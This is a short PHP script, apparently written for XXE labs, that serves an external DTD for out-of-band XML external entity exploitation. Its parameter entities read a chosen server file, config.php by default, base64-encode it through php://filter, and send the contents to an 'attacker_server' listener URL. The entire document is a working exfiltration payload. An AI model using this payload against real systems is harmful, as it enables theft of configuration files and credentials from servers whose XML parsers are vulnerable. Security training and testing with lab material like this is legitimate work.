<?php
// test: http://localhost/fuzzer_payload.php?file_name=s3cret_file

// Simple proxy script to echo custom XML payloads for XXE labs
$file_name = "config.php"; // default

if (!empty($_GET['file_name'])) {
    $file_name = $_GET['file_name'];
}

// ? is a bad char in ENTITY SYSTEM URLs, so we use ___ as a delimiter
// This generates: http://127.0.0.1:5050/?fname=config.php___data=<BASE64>
$attacker_server = "http://127.0.0.1:5050/?fname=" . urlencode($file_name) . "___data=";

header('Content-Type: text/xml');

echo <<<XML
<!ENTITY % resource SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/html/$file_name">
<!ENTITY % LoadOOBEnt "<!ENTITY &#x25; OOB SYSTEM '$attacker_server%resource;'>">
XML;
?>

